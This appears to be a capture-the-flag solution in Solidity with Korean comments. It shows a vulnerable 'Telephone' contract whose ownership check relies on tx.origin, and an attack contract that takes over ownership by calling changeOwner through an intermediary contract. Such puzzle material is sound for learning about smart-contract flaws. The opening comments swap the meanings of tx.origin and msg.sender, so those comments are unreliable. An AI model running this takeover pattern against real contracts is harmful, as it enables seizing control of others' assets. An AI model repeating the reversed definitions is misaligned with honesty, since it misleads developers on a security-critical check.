//tx.origin : 현재 함수를 직접 호출한 계정
// msg.sender : 전체 트랜잭션을 최초로 시작한 계정(EOA)

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) { //ca로 함수를 호출하면 됨
            owner = _owner;
        } 
    }
}

//공격 컨트랙트

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract TelephoneAttack {
    ITelephone target;
    
    constructor(address _target) {
        target = ITelephone(_target);
    }
    
    function attack() public {
        target.changeOwner(tx.origin);
    }
}